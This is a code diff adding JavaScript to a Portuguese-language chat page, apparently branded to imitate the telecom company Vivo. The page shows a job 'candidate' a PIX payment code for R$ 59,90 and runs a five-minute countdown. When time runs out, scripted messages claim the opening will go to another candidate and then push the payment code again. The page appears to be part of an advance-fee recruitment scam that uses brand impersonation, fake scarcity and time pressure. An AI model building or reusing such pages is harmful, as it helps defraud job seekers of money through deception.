+                pixContainer.innerHTML = `
+                    <div style="margin-bottom: 15px;">
+                        <strong style="color: var(--vivo-purple); font-size: 1.1rem;">Código PIX Copia e Cola</strong>
+                    </div>
+                    <div style="background: white; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin: 10px 0; font-family: monospace; word-break: break-all; font-size: 0.9rem;" id="pixCodeText">
+                        ${candidateData.pixCode}
+                    </div>
+                    <button onclick="copyPixCode()" style="background: var(--vivo-purple); color: white; border: none; border-radius: 25px; padding: 12px 24px; font-weight: 600; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.background='var(--vivo-purple-light)'" onmouseout="this.style.background='var(--vivo-purple)'">
+                        <i class="fas fa-copy"></i> Copiar Código PIX
+                    </button>
+                    <div style="margin-top: 10px; font-size: 0.8rem; color: #666;">
+                        Valor: R$ 59,90
+                    </div>
+                `;
+                
+                chatContainer.appendChild(pixContainer);
+                scrollToBottom();
+            } else {
+                addMessage("Infelizmente não foi possível recuperar seu código PIX. Por favor, acesse novamente a página de pagamento.");
+            }
+        }
+        
+        // Função para copiar o código PIX
+        function copyPixCode() {
+            const pixCodeText = candidateData.pixCode;
+            
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixCodeText).then(() => {
+                    showCopySuccess();
+                }).catch(() => {
+                    fallbackCopy(pixCodeText);
+                });
+            } else {
+                fallbackCopy(pixCodeText);
+            }
+        }
+        
+        // Função de fallback para copiar
+        function fallbackCopy(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.left = '-999999px';
+            textArea.style.top = '-999999px';
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                showCopySuccess();
+            } catch (err) {
+                console.error('Erro ao copiar:', err);
+                alert('Não foi possível copiar automaticamente. Por favor, selecione e copie o código manualmente.');
+            }
+            
+            textArea.remove();
+        }
+        
+        // Função para mostrar sucesso da cópia
+        function showCopySuccess() {
+            addMessage("✅ Código PIX copiado com sucesso! Cole no seu aplicativo bancário para efetuar o pagamento de R$ 59,90.");
+        }
+
+        // Função para iniciar o timer
+        function startTimer() {
+            timerContainer.classList.remove('hidden');
+            
+            let timeLeft = 5 * 60; // 5 minutos em segundos
+            
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 60) { // Último minuto
+                    timerElement.style.color = '#FF0000';
+                    timerContainer.classList.add('highlight-pulse');
+                }
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    // Adicionar mensagem de tempo esgotado
+                    addMessage("Observo que o tempo se esgotou. Infelizmente, precisarei liberar a vaga para outro candidato.");
+                    
+                    // Pausa antes de mostrar o código PIX
+                    setTimeout(() => {
+                        addMessage("No entanto, como você demonstrou interesse, vou enviar seu código PIX para que possa efetuar o pagamento se decidir prosseguir:");
+                        
+                        // Pausa antes de mostrar o código PIX
+                        setTimeout(() => {
+                            showPixCode();
+                        }, 2000);
+                    }, 3000);
+                }
+                
+                timeLeft--;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
